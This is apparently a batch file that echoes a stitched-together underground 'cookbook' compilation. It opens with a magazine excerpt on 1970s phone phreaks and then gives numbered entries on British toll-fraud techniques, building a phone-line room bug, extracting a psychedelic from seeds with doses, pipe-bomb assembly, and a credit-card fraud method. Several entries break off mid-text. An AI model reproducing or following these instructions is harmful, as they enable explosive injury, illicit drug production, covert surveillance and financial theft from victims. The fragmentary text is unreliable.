echo you're pretending you're doing something you're actually not, or at least it's no longer you that's doing what you thought you were doing. It's all 
echo Lewis Carroll. Physical chemistry and phone-phreaking. That's why you have these phone-phreak pseudonyms like The Cheshire Cat, the Red 
echo King, and The Snark. But there's something about phone-phreaking that you don't find in physical chemistry." He looks up at me:
echo "Did you ever steal anything?"
echo "Well yes, I..."
echo "Then you know You know the rush you get. It's not just knowledge, like physical chemistry. It's forbidden knowledge. You know. You can 
echo learn about anything under the sun and be bored to death with it. But the idea that it's illegal. Look: you can be small and mobile and smart and 
echo you're ripping off somebody large and powerful and very dangerous."
echo People like Gilbertson and Alexander Graham Bell are always talking about ripping off the phone company and screwing Ma Bell. But if they 
echo were shown a single button and told that by pushing it they could turn the entire circuitry of A.T.andT. into molten puddles, they probably wouldn't 
echo push it. The disgruntled-inventor phone phreak needs the phone system the way the lapsed Catholic needs the Church, the way Satan needs 
echo a God, the way The Midnight Skulker needed, more than anything else, response.
echo Later that evening Gilbertson finished telling me how delighted he was at the flood of blue boxes spreading throughout the country, how 
echo delighted he was to know that "this time they're really screwed." He suddenly shifted gears.
echo "Of course. I do have this love/hate thing about Ma Bell. In a way I almost like the phone company. I guess I'd be very sad if they were to 
echo disintegrate. In a way it's just that after having been so good they turn out to have these things wrong with them. It's those flaws that allow me 
echo to get in and mess with them, but I don't know. There's something about it that gets to you and makes you want to get to it, you know."
echo I ask him what happens when he runs out of interesting, forbidden things to learn about the phone system.
echo "I don't know, maybe I'd go to work for them for a while."
echo "In security even?"
echo "I'd do it, sure. I just as soon play -- I'd just as soon work on either side."
echo "Even figuring out how to trap phone phreaks? I said, recalling Mark Bernay's game."
echo "Yes, that might be interesting. Yes, I could figure out how to outwit the phone phreaks. Of course if I got too good at it, it might become boring 
echo again. Then I'd have to hope the phone phreaks got much better and outsmarted me for a while. That would move the quality of the game up 
echo one level. I might even have to help them out, you know, 'Well, kids, I wouldn't want this to get around but did you ever think of -- ?' I could keep 
echo it going at higher and higher levels forever."
echo The dealer speaks up for the first time. He has been staring at the soft blinking patterns of light and colors on the translucent tiled wall facing 
echo him. (Actually there are no patterns: the color and illumination of every tile is determined by a computerized random-number generator design ed 
echo by Gilbertson which insures that there can be no meaning to any sequence of events in the tiles.)
echo "Those are nice games you're talking about," says the dealer to his friend. "But I wouldn't mind seeing them screwed. A telephone isn't private 
echo anymore. You can't say anything you really want to say on a telephone or you have to go through that paranoid bullshit. 'Is it cool to talk on the 
echo phone?' I mean, even if it is cool, if you have to ask 'Is it cool,' then it isn't cool. You know. 'Is it cool,' then it isn't cool. You know. Like those 
echo blind kids, people are going to start putting together their own private telephone companies if they want to really talk. And you know what else. 
echo You don't hear silences on the phone anymore. They've got this time-sharing thing on long-distance lines where you make a pause and they 
echo snip out that piece of time and use it to carry part of somebody else's conversation.Instead of a pause, where somebody's maybe breathing or 
echo sighing, you get this blank hole and you only start hearing again when someone says a word and even the beginning of the word is clipped 
echo off. Silences don't count -- you're paying for them, but they take them away from you. It's not cool to talk and you can't hear someone when 
echo they don't talk. What the hell good is the phone? I wouldn't mind seeing them totally screwed."
echo The Big Memphis Bust
echo Joe Engressia never wanted to screw Ma Bell. His dream had always been to work for her.
echo The day I visited Joe in his small apartment on Union Avenue in Memphis, he w as upset about another setback in his application for a telephone 
echo job.
echo "They're stalling on it. I got a letter today telling me they'd have to postpone the interview I requested again. My landlord read it for me. They 
echo gave me some runaround about wanting papers on my rehabilitation status but I think there's something else going on."
echo When I switched on the 40-watt bulb in Joe's room -- he sometimes forgets when he has guests -- it looked as if there was enough telephone 
echo hardware to start a small phone company of his own.
echo There is one phone on top of his desk, one phone sitting in an open drawer beneath the desk top. Next to the desk-top phone is a cigar-boxsize M-F device with big toggle switches, and next to that is some kind of switching and coupling device with jacks and alligator plugs hanging 
echo loose. Next to that is a Braille typewriter. On the floor next to the desk, lying upside down like a dead tortoise, is the half-gutted body of an old 
echo black standard phone. Across the room on a torn and dusty couch are two more phones, one of them a touch-tone model; two tape recorders; 
echo a heap of phone patches and cassettes, and a life-size toy telephone.
echo Our conversation is interrupted every ten minutes by phone phreaks from all over the country ringing Joe on just about every piece of 
echo equipment but the toy phone and the Braille typewriter. One fourteen-year-old blind kid from Connecticut calls up and tells Joe he's got a girl 
echo friend. He wants to talk to Joe about girl friends. Joe says they'll talk later in the evening when they can be alone on the line. Joe draws a deep 
echo breath, whistles him off the air with an earsplitting 2600-cycle whistle. Joe is pleased to get the calls but he looked worried and preoccupied 
echo that evening, his brow constantly furrowed over his dark wandering eyes. In addition to the phone-company stall, he has just learned that his 
echo apartment house is due to be demolished in sixty days for urban renewal. For all its shabbiness, the Union Avenue apartment house has been 
echo Joe's first home-of-his-ow n and he's worried that he may not find another before this one is demolished.
echo But what really bothers Joe is that switchmen haven't been listening to him. "I've been doing some checking on 800 numbers lately, and I've 
echo discovered that certain 800 numbers in New Hampshire couldn't be reached from Missouri and Kansas. Now it may sound like a small thing, but 
echo I don't like to see sloppy work; it makes me feel bad about the lines. So I've been calling up switching offices and reporting it, but they haven't 
echo corrected it. I called them up for the third time today and instead of checking they just got mad. Well, that gets me mad. I mean, I do try to help 
echo them. There's something about them I can't understand -- you want to help them and they just try to say you're defrauding them."
echo It is Sunday evening and Joe invites me to join him for dinner at a Holiday Inn. Frequently on Sunday evening Joe takes some of his welfare 
echo money, calls a cab, and treats himself to a steak dinner at one of Memphis' thirteen Holiday Inns. (Memphis is the headquarters of Holiday Inn. 
echo Holiday Inns have been a favorite for Joe ever since he made his first solo phone trip to a Bell switching office in Jacksonville, Florida, and 
echo stayed in the Holiday Inn there. He likes to stay at Holiday Inns, he explains, because they represent freedom to him and because the rooms are 
echo arranged the same all over the country so he knows that any Holiday Inn room is familiar territory to him. Just like any telephone.)
echo Over steaks in the Pinnacle Restaurant of the Holiday Inn Medical Center on Madison Avenue in Memphis, Joe tells me the highlights of his life 
echo as a phone phreak.
echo At age seven, Joe learned his first phone trick. A mean baby -sitter, tired of listening to little Joe play with the phone as he always did, 
echo constantly, put a lock on the phone dial. "I got so mad. When there's a phone sitting there and I can't use it... so I started getting mad and 
echo banging the receiver up and down. I noticed I banged it once and it dialed one. Well, then I tried banging it twice...." In a few minutes Joe 
echo learned how to dial by pressing the hook switch at the right time. "I was so excited I remember going 'whoo whoo' and beat a box down on 
echo the floor."
echo At age eight Joe learned about whistling. "I was listening to some intercept non working-number recording in L.A.- I was calling L.A. as far 
echo back as that, but I'd mainly dial non working numbers because there was no charge, and I'd listen to these recordings all day. Well, I was 
echo whistling 'cause listening to these recordings can be boring after a while even if they are from L.A., and all of a sudden, in the middle of 
echo whistling, the recording clicked off. I fiddled around whistling some more, and the same thing happened. So I called up the switch room and 
echo said, 'I'm Joe. I'm eight years old and I want to know why when I whistle this tune the line clicks off.' He tried to explain it to me, but it was a little 
echo too technical at the time. I went on learning. That was a thing nobody was going to stop me from doing. The phones were my life, and I was 
echo going to pay any price to keep on learning. I knew I could go to jail. But I had to do what I had to do to keep on learning."
echo The phone is ringing when we walk back into Joe's apartment on Union Avenue. It is Captain Crunch. The Captain has been following me 
echo around by phone, calling up everywhere I go with additional bits of advice and explanation for me and whatever phone phreak I happen to be 
echo visiting. This time the Captain reports he is calling from what he describes as "my hideaway high up in the Sierra Nevada." He pulses out lusty 
echo salvos of M-F and tells Joe he is about to "go out and get a little action tonight. Do some phreaking of another kind, if you know what I mean." 
echo Joe chuckles.
echo The Captain then tells me to make sure I understand that what he told me about tying up the nation's phone lines was true, but that he and the 
echo phone phreaks he knew never used the technique for sabotage. They only learned the technique to help the phone company.
echo "We do a lot of troubleshooting for them. Like this New Hampshire/Missouri WATS-line flaw I've been screaming about. We help them more than 
echo they know."
echo After we say good-bye to the Captain and Joe whistles him off the line, Joe tells me about a disturbing dream he had the night before: "I had 
echo been caught and they were taking me to a prison. It was a long trip. They were taking me to a prison a long long way away. And we stopped 
echo at a Holiday Inn and it was my last night ever using the phone and I was crying and crying, and the lady at the Holiday Inn said, 'Gosh, honey, 
echo you should never be sad at a Holiday Inn. You should always be happy here. Especially since it's your last night.' And that just made it worse 
echo and I was sobbing so much I couldn't stand it."
echo Two weeks after I left Joe Engressia's apartment, phone-company security agents and Memphis police broke into it. Armed with a warrant, 
echo which they left pinned to a wall, they confiscated every piece of equipment in the room, including his toy telephone. Joe was placed under 
echo arrest and taken to the city jail where he was forced to spend the night since he had no money and knew no one in Memphis to call.
echo It is not clear who told Joe what that night, but someone told him that the phone company had an open-and-shut case against him because of 
echo revelations of illegal activity he had made to a phone-company undercover agent.
echo By morning Joe had become convinced that the reporter from Esquire, with whom he had spoken two weeks ago, was the undercover agent. 
echo He probably had ugly thoughts about someone he couldn't see gaining his confidence, listening to him talk about his personal obsessions and 
echo dreams, while planning all the while to lock him up.
echo "I really thought he was a reporter," Engressia told the Memphis Press-Seminar. "I told him everything...." Feeling betrayed, Joe proceeded to 
echo confess everything to the press and police.
echo As it turns out, the phone company did use an undercover agent to trap Joe, although it was not the Esquire reporter.
echo Ironically, security agents were alerted and began to compile a case against Joe because of one of his acts of love for the system: Joe had 
echo called an internal service department to report that he had located a group of defective long-distance trunks, and to complain again about the 
echo New Hampshire/Missouri WATS problem. Joe always liked Ma Bell's lines to be clean and responsive. A suspicious switchman reported Joe to 
echo the security agents who discovered that Joe had never had a long-distance call charged to his name.
echo Then the security agents learned that Joe was planning one of his phone trips to a local switching office. The security people planted one of 
echo their agents in the switching office. He posed as a student switchman and followed Joe around on a tour. He was extremely friendly and 
echo helpful to Joe, leading him around the office by the arm. When the tour was over he offered Joe a ride back to his apartment house. On the 
echo way he asked Joe -- one tech man to another -- about "those blue boxers" he'd heard about. Joe talked about them freely, talked about his blue 
echo box freely, and about all the other things he could do with the phones.
echo The next day the phone-company security agents slapped a monitoring tape on Joe's line, which eventually picked up an illegal call. Then they 
echo applied for the search warrant and broke in.
echo In court Joe pleaded not guilty to possession of a blue box and theft of service. A sympathetic judge reduced the charges to malicious mischief 
echo and found him guilty on that count, sentenced him to two thirty-day sentences to be served concurrently and then suspended the sentence on 
echo condition that Joe promise never to play with phones again. Joe promised, but the phone company refused to restore his service. For two 
echo weeks after the trial Joe could not be reached except through the pay phone at his apartment house, and the landlord screened all calls for 
echo him.
echo Phone-phreak Carl managed to get through to Joe after the trial, and reported that Joe sounded crushed by the whole affair.
echo "What I'm worried about," Carl told me, "is that Joe means it this time. The promise. That he'll never phone-phreak again. That's what he told me, 
echo that he's given up phone-phreaking for good. I mean his entire life. He says he knows they're going to be watching him so closely for the rest 
echo of his life he'll never be able to make a move without going straight to jail. He sounded very broken up by the whole experience of being in jail. It 
echo was awful to hear him talk that way. I don't know. I hope maybe he had to sound that way. Over the phone, you know."
echo He reports that the entire phone-phreak underground is up in arms over the phone company's treatment of Joe. "All the while Joe had his 
echo hopes pinned on his application for a phone-company job, they were stringing him along getting ready to bust him. That gets me mad. Joe spent 
echo most of his time helping them out. The bastards. They think they can use him as an example. All of sudden they're harassing us on the coast. 
echo Agents are jumping up on our lines. They just busted ------'s mute yesterday and ripped out his lines. But no matter what Joe does, I don't think 
echo we're going to take this lying down."
echo Two weeks later my phone rings and about eight phone phreaks in succession say hello from about eight different places in the country, 
echo among them Carl, Ed, and Captain Crunch. A nationwide phone-phreak conference line has been reestablished through a switching machine in 
echo --------, with the cooperation of a disgruntled switchman.
echo "We have a special guest with us today," Carl tells me.
echo The next voice I hear is Joe's. He reports happily that he has just moved to a place called Millington, Tennessee, fifteen miles outside of 
echo Memphis, where he has been hired as a telephone-set repairman by a small independent phone company. Someday he hopes to be an 
echo equipment troubleshooter.
echo "It's the kind of job I dreamed about. They found out about me from the publicity surrounding the trial. Maybe Ma Bell did me a favor busting me. 
echo I'll have telephones in my hands all day long."
echo "You know the expression, 'Don't get mad, get even'?" phone-phreak Carl asked me. "Well, I think they're going to be very sorry about what 
echo they did to Joe and what they're trying to do to us."

echo 151.The History of British Phreaking by Lex Luthor
echo Note: The British post office, is the US equivalent of Ma Bell. In Britain, phreaking goes back to the early fifties, when the technique of 'toll a 
echo drop back' was discovered. Toll a was an exchange near St.Pauls which routed calls between London and nearby non-London exchanges. 
echo The trick was to dial an unallocated number, and then depress the receiver-rest for « second. This flashing initiated the 'clear forward' signal, 
echo leaving the caller with an open line into the toll a exchange. They could then dial 018, which forwarded him to the trunk exchange at that time, 
echo the first long distance exchange in Britain and follow it with the code for the distant exchange to which he would be connected at no extra 
echo charge.
echo The signals needed to control the UK network today were published in the "Institution of Post Office Engineers Journal" and reprinted in the 
echo Sunday times (15 Oct. 1972).
echo The signaling system they use: Signaling system No.3 uses pairs of frequencies selected from 6 tones separated by 120hz. With that info, the 
echo phreaks made "bleepers" or as they are called here in the US "blue box", but they do utilize different MF tones then the US, thus, your US blue 
echo box that you smuggled into the UK will not work, unless you change the frequencies.
echo In the early seventies, a simpler system based on different numbers of pulses with the same frequency (2280hz) was used. For more info on 
echo that, try to get a hold of: Atkinson's "Telephony and Systems Technology".
echo In the early days of British phreaking, the Cambridge university Titan computer was used to record and circulate numbers found by the 
echo exhaustive dialing of local networks. These numbers were used to create a chain of links from local exchange to local exchange across the 
echo country, bypassing the trunk circuits. Because the internal routing codes in the UK network are not the same as those dialed by the caller, the 
echo phreaks had to discover them by 'probe and listen' techniques or more commonly known in the US -- scanning. What they did was put in likely 
echo signals and listened to find out if they succeeded. The results of scanning were circulated to other phreaks. Discovering each other took time 
echo at first, but eventually the phreaks became organized. The "tap" of Britain was called "undercurrents" which enabled British phreaks to share 
echo the info on new numbers, equipment etc.
echo To understand what the British phreaks did, think of the phone network in three layers of lines: Local, trunk, and international. In the UK, 
echo subscriber trunk dialing (std), is the mechanism which takes a call from the local lines and (legitimately) elevates it to a trunk or international 
echo level. The UK phreaks figured that a call at trunk level can be routed through any number of exchanges, provided that the right routing codes 
echo were found and used correctly. They also had to discover how to get from local to trunk level either without being charged (which they did 
echo with a bleeper box) or without using (std). Chaining has already been mentioned but it requires long strings of digits and speech gets more and 
echo more faint as the chain grows, just like it does when you stack trunks back and forth across the US. The way the security reps snagged the 
echo phreaks was to put a simple 'printermeter' or as we call it: A pen register on the suspects line, which shows every digit dialed from the 
echo subscribers line.
echo The British prefer to get onto the trunks rather than chaining. One way was to discover where local calls use the trunks between neighboring 
echo exchanges, start a call and stay on the trunk instead of returning to the local level on reaching the distant switch. This again required 
echo exhaustive dialing and made more work for titan; it also revealed 'fiddles', which were inserted by post office engineers.
echo What fiddling means is that the engineers rewired the exchanges for their own benefit. The equipment is modified to give access to a trunk 
echo without being charged, an operation which is pretty easy in step by step (SxS) electro-mechanical exchanges, which were installed in Britain 
echo even in the 1970's (Note: I know of a back door into the Canadian system on a 4A Co., so if you are on SxS or a 4A, try scanning 3 digit 
echo exchanges, i.e.: dial 999,998,997 etc. And listen for the beep-kerchink, if there are no 3 digit codes which allow direct access to a tandem in 
echo your local exchange and bypasses the AMA so you won't be billed, not have to blast 2600 every time you wish to box a call.
echo A famous British 'fiddler' revealed in the early 1970's worked by dialing 173. The caller then added the trunk code of 1 and the subscribers 
echo local number. At that time, most engineering test services began with 17X, so the engineers could hide their fiddles in the nest of service 
echo wires. When security reps started searching, the fiddles were concealed by tones signaling: 'Number unobtainable' or 'Equipment engaged' 
echo which switched off after a delay. The necessary relays are small and easily hidden.
echo There was another side to phreaking in the UK in the sixties. Before STD was widespread, many 'ordinary' people were driven to.
echo Occasional phreaking from sheer frustration at the inefficient operator controlled trunk system. This came to a head during a strike about 1961 
echo when operators could not be reached. Nothing complicated was needed. Many operators had been in the habit of repeating the codes as they 
echo dialed the requested numbers so people soon learnt the numbers they called frequently. The only 'trick' was to know which exchanges could 
echo be dialed through to pass on the trunk number. Callers also needed a pretty quiet place to do it, since timing relative to clicks was important. The 
echo most famous trial of British phreaks was called the old Baily trial. Which started on Oct. 3rd, 1973. What the phreaks did was dial a spare 
echo number at a local call rate, but involving a trunk to another exchange then they sent a 'clear forward' to their local exchange, indicating to it that 
echo the call was finished; but the distant exchange doesn't realize because the caller's phone is still off the hook. They now have an open line into 
echo the distant trunk exchange and sent to it a 'seize' signal: '1' which puts him onto its outgoing lines now, if they know the codes, the world is 
echo open to them. All other exchanges trust his local exchange to handle the billing; they just interpret the tones they hear. Meanwhile, the local 
echo exchange collects only for a local call. The investigators discovered the phreaks holding a conference somewhere in England surrounded by 
echo various phone equipment and bleeper boxes, also printouts listing 'secret' post office codes. (They probably got them from trashing?) The 
echo judge said: "Some take to heroin, some take to telephones." for them phone phreaking was not a crime, but a hobby to be shared with phellow 
echo enthusiasts and discussed with the post office openly over dinner and by mail. Their approach and attitude to the worlds largest computer, the 
echo global telephone system, was that of scientists conducting experiments or programmers and engineers testing programs and systems. The 
echo judge appeared to agree, and even asked them for phreaking codes to use from his local exchange

echo 152.Bad as Shit by The Jolly Roger
echo Recently, a telephone fanatic in the northwest made an interesting discovery. He was exploring the 804 area code (Virginia) and found out 
echo that the 840 exchange did something strange.
echo In the vast majority of cases, in fact in all of the cases except one, he would get a recording as if the exchange didn't exist. However, if he 
echo dialed 804-840 and four rather predictable numbers, he got a ring
echo After one or two rings, somebody picked up. Being experienced at this kind of thing, he could tell that the call didn't "supe", that is, no charges 
echo were being incurred for calling this number.
echo (Calls that get you to an error message, or a special operator, generally don't supervise.) A female voice, with a hint of a Southern accent 
echo said, "Operator, can I help you?"
echo "Yes," he said, "What number have I reached?"
echo "What number did you dial, sir?"
echo He made up a number that was similar.
echo "I'm sorry that is not the number you reached." Click.
echo He was fascinated. What in the world was this? He knew he was going to call back, but before he did, he tried some more experiments. He 
echo tried the 840 exchange in several other area codes. In some, it came up as a valid exchange. In others, exactly the same thing happened -- the 
echo same last four digits, the same Southern belle. Oddly enough, he later noticed, the areas worked in seemed to travel in a beeline from 
echo Washington DC to Pittsburgh, PA.
echo He called back from a payphone. "Operator, can I help you?"
echo "Yes, this is the phone company. I'm testing this line and we don't seem to have an identification on your circuit. What office is this, please?"
echo "What number are you trying to reach?"
echo "I'm not trying to reach any number. I'm trying to identify this circuit."
echo "I'm sorry, I can't help you."
echo "Ma'am, if I don't get an ID on this line, I'll have to disconnect it. We show no record of it here."
echo "Hold on a moment, sir."
echo After about a minute, she came back. "Sir, I can have someone speak to you. Would you give me your number, please?"
echo He had anticipated this and he had the payphone number ready. After he gave it, she said, "Mr. XXX will get right back to you."
echo "Thanks." He hung up the phone. It rang. INSTANTLY"
echo "Hello," he said, trying to sound authoritative.
echo "This is Mr. XXX. Did you just make an inquiry to my office concerning a phone number?"
echo "Yes. I need an identi--"
echo "What you need is advice. Don't ever call that number again. Forget you ever knew it."
echo At this point our friend got so nervous he just hung up. He expected to hear the phone ring again but it didn't.
echo Over the next few days he racked his brains trying to figure out what the number was. He knew it was something big -- that was pretty 
echo certain at this point. It was so big that the number was programmed into every central office in the country. He knew this because if he tried to 
echo dial any other number in that exchange, he'd get a local error message from his CO, as if the exchange didn't exist.
echo It finally came to him. He had an uncle who worked in a federal agency. He had a feeling that this was government related and if it was, his 
echo uncle could probably find out what it was. He asked the next day and his uncle promised to look into the matter.
echo The next time he saw his uncle, he noticed a big change in his manner. He was trembling. "Where did you get that number?" he shouted. "Do 
echo you know I almost got fired for asking about it?? They kept wanting to know where I got it."
echo Our friend couldn't contain his excitement. "What is it?" he pleaded. "What's the number?"
echo "IT'S THE PRESIDENT'S BOMB SHELTER"
echo He never called the number after that. He knew that he could probably cause quite a bit of excitement by calling the number and saying 
echo something like, "The weather's not good in Washington. We're coming over for a visit." But our friend was smart. He knew that there were 
echo some things that were better off unsaid and undone.

echo 154.Fucking with the Operator by The Jolly Roger
echo Ever get an operator who gave you a hard time, and you didn't know what to do? Well if the operator hears you use a little Bell jargon, she 
echo might wise up. Here is a little diagram (excuse the artwork) of the structure of operators
echo "/--------\ /------\ /-----\"
echo "-- >  --->"
echo "\--------/ \------/ \-----/"
echo.  
echo.  
echo  "V"
echo "/-------------\"
echo. 
echo "\-------------/"
echo Now most of the operators are not bugged, so they can curse at you, if they do ask INSTANTLY for the "S.A." or the Service Assistant. The 
echo operator does not report to her (95% of them are hers) but they will solve most of your problems. She MUST give you her name as she 
echo connects and all of these calls are bugged. If the SA gives you a rough time get her BOS (Business Office Supervisor) on the line. S/He will 
echo almost always back her girls up, but sometimes the SA will get tarred and feathered. The operator reports to the Group Chief, and S/He will 
echo solve 100% of your problems, but the chances of getting S/He on the line are nill.
echo If a lineman (the guy who works out on the poles) or an installation man gives you the works ask to speak to the Installation Foreman, that 
echo works wonders.
echo Here is some other bell jargon, that might come in handy if you are having trouble with the line. Or they can be used to lie your way out of 
echo situations....
echo An Erling is a line busy for 1 hour, used mostly in traffic studies A Permanent Signal is that terrible howling you get if you disconnect, but don't 
echo hang up.
echo Everyone knows what a busy signal is, but some idiots think that is the *Actual* ringing of the phone, when it just is a tone "beeps" when the 
echo phone is ringing, wouldn't bet on this though, it can (and does) get out of sync.
echo When you get a busy signal that is 2 times as fast as the normal one, the person you are trying to reach isn't really on the phone, (he might be), 
echo it is actually the signal that a trunk line somewhere is busy and they haven't or can't reroute your call. Sometimes you will get a Recording, or if 
echo you get nothing at all (Left High and Dry in fone terms) all the recordings are being used and the system is really overused, will probably go down 
echo in a little while. This happened when Kennedy was shot, the system just couldn't handle the calls. By the way this is called the "reorder signal" 
echo and the trunk line is "blocked".

echo originally made by Information Unlimited, and had a touch tone decoder to prevent all who did not know the code from being able to use the 
echo phone in its normal way. This version, however, will activate the microphone for anyone who calls while it is in operation.
echo NOTE: It is illegal to use this device to try to bug someone. It is also pretty stupid because they are fairly noticeable.

echo Circuit Operation: Not being the most technical guy in the world, and not being very good at electronics (yet), I'm just repeating what Mr. 
echo Iannini's said about the circuit operation. The Transmitter consists of a high grain amplifier fed into the telephone lines via transformer. The 
echo circuit is initiated by the action of a voltage transient pulse occurring across the phone line at the instant the telephone circuit is made (the 
echo ring, in other words). This transient immediately triggers a timer whose output pin 3 goes positive, turning on transistors Q2 and Q3. Timer 
echo TM1 now remains in this state for a period depending on the values of R17 and C13 (usually about 10 seconds for the values shown). When 
echo Q3 is turned on by the timer, a simulated "off hook" condition is created by the switching action of Q3 connecting the 500 ohm winding of the 
echo transformer directly across the phone lines. Simultaneously, Q2 clamps the ground of A1, amplifier, and Q1, output transistor, to the negative 
echo return of B1, B2, therefore enabling this amplifier section. Note that B2 is always required by supplying quiescent power to TM1 during 
echo normal conditions. System is off/on controlled by S1 (switch). A crystal mike picks up the sounds that are fed to the first two transistors of 
echo the A1 array connected as an emitter follower driving the remaining two transistors as cascaded common emitters. Output of the array 
echo now drives Q1 capacitively coupled to the 1500 ohm winding of T1. R7 controls the pick up sensitivity of the system. Diode D1 is 
echo forward biased at the instant of connection and essentially applies a negative pulse at pin 2 of TM1, initiating the cycle. D2 clamps any high 
echo positive pulses. C9 dc-isolates and desensitizes the circuit. The system described should operate when any incoming call is made without 
echo ringing the phone.
echo Schematic Diagram: Because this is text, this doesn't look too hot. Please use a little imagination I will hopefully get a graphics drawing of this 
echo out as soon as I can on a Fontrix graffile.
echo To be able to see what everything is, this character: | should appear as a horizontal bar. I did this on a ][e using a ][e 80 column card, so I'm

echo Construction notes: Because the damned book just gave a picture instead of step by step instructions, and I'll try to give you as much help as 
echo possible. Note that all the parts that you will be using are clearly labeled in the schematic. The perfboard, knobs, 'gator clips, etc are optional. I 
echo do strongly suggest that you do use the board It will make wiring the components up much much easier than if you don't use it. The knob you 
echo can use to control the pot (R7). R7 is used to tune the IT so that is sounds Ok over the phone. (You get to determine what sounds good) By 
echo changing the value of C13, you can change the amount of time that the circuit will stay open (it cannot detect a hang up, so it works on a 
echo timer.) A value of 100 micro Farads will increase the time by about 10 times. The switch (S1) determines whether or not the unit is operational. 
echo Closed is on. Open is off. The negative return is the negative terminals of the battery The batteries will look something like this when hooked 
echo up:

echo To hook this up to the phone line, there are three ways, depending upon what type of jack you have. If it is the old type (non modular) then you 
echo can just open up the wall plate and connect the wires from the transmitter directly to the terminals of the phone.
echo If you have a modular jack with four prongs, attach the red to the negative prong (don't ask me which is which I don't have that type of jack... 
echo I've only seen them in stores), and the green to the positive prong, and plug in. Try not to shock yourself...
echo If you have the clip-in type jack, get double male extension cord (one with a clip on each end), and chop off one clip. Get a sharp knife and 
echo splice off the gray protective material. You should see four wires, including one green and one red. You attach the appropriate wires from the 
echo IT to these two, and plug the other end into the wall.
echo Getting the IT to work: If you happen to have a problem, you should attempt to do the following (these are common sense rules) Make sure 
echo that you have the polarity of all the capacitors right (if you used polarized capacitors, that is). Make sure that all the soldering is done well and 
echo has not short circuited something accidentally (like if you have a glob touching two wires which should not be touching.) Check for other short 
echo circuits. Check to see if the battery is in right. Check to make sure the switch is closed. If it still doesn't work, drop me a line on one of the 
echo Maryland or Virginia BBSs and I'll try to help you out.
echo The sense output: Somehow or other, it is possible to hook something else up to this and activate it by phone (like an alarm, flashing lights, etc.)

echo 158.LSD by The Jolly Roger
echo I think, of all the drugs on the black market today, LSD is the strangest. It is the most recent major drug to come to life in the psychedelic 
echo subculture. (Blah blah blah... let's get to the good stuff: How to make it in your kitchen)
echo 1.Grind up 150 grams of Morning Glory seeds or baby Hawaiian wood rose seeds.
echo 2.In 130 cc. of petroleum ether, soak the seeds for two days.
echo 3.Filter the solution through a tight screen.
echo 4.Throw away the liquid, and allow the seed mush to dry.
echo 5.For two days allow the mush to soak in 110 cc. of wood alcohol.
echo 6.Filter the solution again, saving the liquid and labeling it "1."
echo 7.Resoak the mush in 110 cc. of wood alcohol for two days.
echo 8.Filter and throw away the mush.
echo 9.Add the liquid from the second soak to the solution labeled "1."
echo 10.Pour the liquid into a cookie tray and allow it to evaporate.
echo 11.When all of the liquid has evaporated, a yellow gum remains. This should be scraped up and put into capsules.
echo · 30 grams of Morning Glory seeds = 1 trip
echo · 15 Hawaiian wood rose seeds = 1 trip
echo Many companies, such as Northop-King have been coating their seeds with a toxic chemical, which is poison. Order seeds from a wholesaler, 
echo as it is much safer and cheaper. Hawaiian wood rose seeds can be ordered directly from:
echo Chong's Nursery and Flowers

echo LSD DOSAGES
echo The basic dosages of acid vary according to what kind of acid is available and what medium of ingestion is used. Chemically, the potency of 
echo LSD-25 is measured in micrograms, or mics. If you're chemically minded or making your own acid, then computing the number of micrograms is 
echo very important. Usually between 500 and 800 mics is plenty for an 8 hour trip, depending on the quality of the acid, of course. I have heard of 
echo people taking as much as 1,500-2,000 mics. This is not only extremely dangerous, it is extremely wasteful.
echo LSD comes packaged in many different forms. The most common are listed below:
echo 1.The brown spot, or a piece of paper with a dried drop of LSD on it, is always around. Usually one spot equals one trip.
echo 2.Capsuled acid is very tricky, as the cap can be almost any color, size, or potency. Always ask what the acid is cut with, as a lot of acid is 
echo cut with either speed or strychnine. Also note dosage.
echo 3.Small white or colored tablets have been known to contain acid, but, as with capsuled acid, it's impossible to tell potency, without asking.

echo Believe it or not, bananas do contain a small quantity of _Musa Sapientum bananadine_, which is a mild, short-lasting psychedelic. There are 
echo much easier ways of getting high, but the great advantage to this method is that bananas are legal.
echo 1.Obtain 15 lbs. of ripe yellow bananas.
echo 2.Peel all 15 lbs. and eat the fruit. Save the peels.
echo 3.With a sharp knife, scrape off the insides of the peels and save the scraped material.
echo 4.Put all of the scraped material in a large pot and add water. Boil for three to four hours until it has attained a solid paste consistency.
echo 5.Spread this paste on cookie sheets, and dry in an over for about 20 minutes to a half hour. This will result in a fine black powder. Makes 
echo about one pound of bananadine powder. Usually one will feel the effects of bananadine after smoking three or four cigarettes.

echo NOTE: To find out how long the fuse cord should be, check the time it takes a known length to burn. If 12 inches burns in 30 seconds, a 6 inch 
echo cord will ignite the grenade in 15 seconds.
echo 2.Screw pipe cap to one end of the pipe. Place fuse cord with blasting cap into the opposite end so that the blasting cap is near the center of 
echo the pipe.
echo NOTE: If plastic explosive is to be used, fill pipe BEFORE inserting blasting cap. Push a round stick into the center of the explosive to make a 
echo hole and then insert the blasting cap.
echo 3.Pour explosive or propellant into pipe a little bit at a time. Tap the base of the pipe frequently to settle filler.
echo 4.Drill a hole in the center of the unassembled pipe cap large enough for the fuse cord to pass through.
echo 5.Wipe pipe threads to remove any filler material. Slide the drilled pipe cap over the fuse and screw hand tight onto the pipe.

echo 166.European Credit Card Fraud by Creditman
echo UK credit card fraud is a lot easier than over in the States. The same basic 3 essentials are needed:
echo 1.A safehouse.
echo 2.Credit card numbers with Exp. date and address.
echo 3.Good suppliers of next day delivery goods.
echo The Safehouse
echo The safehouse should be on the ground floor, so as not to piss off the delivery man when he comes to drop off your freshly stolen gear. If he 
echo has to go up 10 flights in a complete dive and some 14 year old kid signs for an A2000 then he's gonna wonder Make sure there are no nosy 
echo neighbors, a good area is one full of yuppies 'cos they all go to work during daytime. Safehouses are usually obtained by paying a month's rent 
echo in advance or putting down a deposit of say, $200. Either that or break into a place and use that.
echo Credit Card Numbers
echo The card number, expiry date, start date (if possible), full name (including middle initial), phone number and full address with postcode are 
echo ideal. If you can only get the sirname, and no postcode, you shouldn't have any real hassle. Just say you moved recently to your new address. 
echo Phone number is handy, if it just rings and rings but if it doesn't, then make sure it's ex-directory. You CANNOT get away with giving them a 
echo bullshit phone number. Some fussy companies want phone numbers just to cross-check on CARDNET but generally it's not needed. To recap, 
echo here's a quick check-list:
echo 1.Card number and expiry date.
echo 2.Name and address of card holder.
echo 3.First name/initials (OPTIONAL)
echo 4.Start date (OPTIONAL)
echo 5.Postcode (OPTIONAL)
echo 6.Phone number (OPTIONAL)
echo If you have all 6, then you shouldn't have any hassle. Start date is the rarest item you could be asked for, postcode and initials being more 
echo common. If you are missing 3-6 then you need one helluva smooth- talking bastard on the phone line
echo The Ordering
